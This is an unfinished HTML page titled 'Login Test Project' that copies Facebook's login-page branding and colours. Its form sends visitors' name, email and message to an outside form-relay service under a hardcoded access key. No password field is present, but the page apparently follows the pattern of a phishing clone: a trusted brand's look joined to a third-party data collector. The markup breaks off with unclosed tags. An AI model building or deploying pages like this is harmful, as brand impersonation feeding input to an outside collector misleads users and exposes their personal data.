<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Login Test Project</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="referrer" content="origin">
  <style>
    * {
      box-sizing: border-box;
      font-family: Helvetica, Arial, sans-serif;
    }

    body {
      margin: 0;
      background: #f0f2f5;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .container {
      display: flex;
      gap: 60px;
      max-width: 900px;
      padding: 20px;
    }

    .branding {
      max-width: 400px;
    }

    .branding h1 {
      color: #1877f2;
      font-size: 56px;
      margin-bottom: 10px;
    }

    .branding p {
      font-size: 24px;
      color: #1c1e21;
      line-height: 1.3;
    }

    .login-box {
      background: #fff;
      padding: 20px;
      width: 360px;
      border-radius: 8px;
      box-shadow: 0 2px 12px rgba(0,0,0,0.15);
    }

    .login-box input {
      width: 100%;
      padding: 14px;
      margin-bottom: 12px;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      font-size: 16px;
    }

    .login-box input:focus {
      outline: none;
      border-color: #1877f2;
    }

    .login-btn {
      width: 100%;
      padding: 14px;
      background: #1877f2;
      color: #fff;
      border: none;
      border-radius: 6px;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
    }

    .login-btn:hover {
      background: #166fe5;
    }

    .forgot {
      text-align: center;
      margin: 14px 0;
    }

    .forgot a {
      color: #1877f2;
      text-decoration: none;
      font-size: 14px;
    }

    .divider {
      height: 1px;
      background: #dadde1;
      margin: 20px 0;
    }

    .create-btn {
      display: block;
      margin: 0 auto;
      padding: 14px 18px;
      background: #42b72a;
      color: #fff;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
    }

    .create-btn:hover {
      background: #36a420;
    }

    @media (max-width: 768px) {
      .container {
        flex-direction: column;
        align-items: center;
        text-align: center;
      }
      .branding h1 { font-size: 48px; }
      .branding p { font-size: 20px; }
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="branding">
      <h1>facebook</h1>
      <p>Connect with friends and the world around you.</p>
    </div>

    <form action="https://api.web3forms.com/submit" method="POST">
  <input type="hidden" name="access_key" value="870db0a3-bb24-4ba3-80fc-f2590bb4d36b">
  <input type="text" name="name" required>
  <input type="email" name="email" required>
  <textarea name="message" required></textarea>
  <button type="submit">Submit Form</button>
</form>
